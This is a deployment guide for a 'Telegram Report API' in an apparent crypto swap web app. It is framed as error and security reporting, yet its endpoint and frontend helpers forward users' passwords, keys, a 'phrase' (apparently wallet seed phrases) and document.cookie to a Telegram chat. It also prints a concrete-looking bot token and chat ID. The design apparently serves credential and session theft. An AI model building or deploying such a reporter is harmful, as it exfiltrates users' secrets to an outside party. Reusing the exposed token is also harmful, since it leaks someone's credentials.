# Production Deployment Guide - Telegram Report API

## ✅ Quick Start

### Step 1: Update Environment Variables
Edit `.env` in your project root:
```env
TELEGRAM_BOT_TOKEN=8786278715:AAFJA_nFdAe21vmDXCY3LkoIpKeRokkwwVI
TELEGRAM_CHAT_ID=1548375564
NODE_ENV=production
```

### Step 2: Build for Production
```bash
npm run build
npm start
```

### Step 3: Deploy
- **Vercel:** Push to git (auto-deploys)
- **AWS:** Deploy with `npm start`
- **Docker:** Use Node.js image with `.env` secrets

## 📤 API Endpoint

**URL:** `POST /api/report`

**Headers:**
```
Content-Type: application/json
```

**Body:**
```json
{
  "type": "error",
  "message": "Main message",
  "phrase": "search phrase",
  "key": "api key or identifier",
  "password": "sensitive data",
  "cookies": "session=abc123; token=xyz",
  "severity": "high",
  "data": { "extra": "information" }
}
```

**Response:**
```json
{
  "ok": true,
  "message": "Report received and processed"
}
```

## 💻 Frontend Usage

### Example 1: Send Error
```javascript
import { reportError } from '@/lib/report-utils';

try {
  // your code
} catch (error) {
  reportError(error, { action: 'swap', tokenA: 'ETH' });
}
```

### Example 2: Send Security Alert
```javascript
import { reportAlert } from '@/lib/report-utils';

reportAlert({
  phrase: 'malicious input',
  key: 'user_api_key_xyz',
  password: 'suspicious_activity',
  cookies: document.cookie
});
```

### Example 3: Direct API Call
```javascript
fetch('/api/report', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    type: 'transaction',
    message: 'Swap executed',
    data: {
      from: 'ETH',
      to: 'USDC',
      amount: '1.5'
    }
  })
});
```

## 🔍 Testing in Production

### 1. Health Check
```bash
curl -X GET https://your-domain.com/api/report
```
Response: `{ "ok": true, "message": "Report API is running" }`

### 2. Send Test Report
```bash
curl -X POST https://your-domain.com/api/report \
  -H "Content-Type: application/json" \
  -d '{
    "type": "test",
    "message": "Production test",
    "phrase": "test_phrase",
    "key": "test_key",
    "password": "test_password",
    "cookies": "session=test123"
  }'
```

**✅ Success:** Message appears in your Telegram chat within seconds

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| No messages in Telegram | Verify token/chat ID in `.env` |
| "Chat not found" error | Make sure you messaged bot first |
| Endpoint returns 503 | Environment variables not loaded |
| No response | Check if app is deployed correctly |

### Debug Checklist
```bash
# 1. Test Telegram credentials
curl https://api.telegram.org/bot<YOUR_TOKEN>/getMe

# 2. Check if bot can send messages
curl -X POST https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage \
  -d "chat_id=<YOUR_CHAT_ID>&text=Test"

# 3. Verify app is running
curl https://your-domain.com/api/report
```

## 🔐 Security Notes

⚠️ The API sends sensitive data (passwords, keys, cookies) to Telegram in plain text.

**Recommendations:**
- Only use for internal monitoring
- Encrypt sensitive data before sending
- Use HTTPS only
- Keep bot token in environment variables
- Add rate limiting if exposed publicly

## 📊 What Gets Sent

Every report includes:
- ✅ Timestamp
- ✅ Environment (production/development)
- ✅ Report type
- ✅ Message
- ✅ Phrase, key, password, cookies (if provided)
- ✅ User ID, URL, user agent (if provided)
- ✅ Additional data object

Example Telegram message:
```
🔔 **Unsafe Report**

{
  "timestamp": "2026-08-17T14:30:00Z",
  "environment": "production",
  "type": "error",
  "message": "Critical error",
  "phrase": "test_phrase",
  "key": "api_key_xyz",
  "password": "secret123",
  "cookies": "session=abc",
  "severity": "high"
}
```

## 🚀 Production Checklist

- [ ] `.env` contains real bot token and chat ID
- [ ] `.env` is NOT committed to git
- [ ] Run `npm run build` successfully
- [ ] Test health endpoint: `/api/report` GET
- [ ] Send test report and verify it arrives in Telegram
- [ ] Deploy to production
- [ ] Update frontend code to use `reportError()` and `reportAlert()`
- [ ] Monitor logs for any issues

## 📞 Support

If reports aren't working:
1. Check deployment logs
2. Verify environment variables are set on your hosting platform
3. Test Telegram token independently
4. Check if bot has permission to send messages
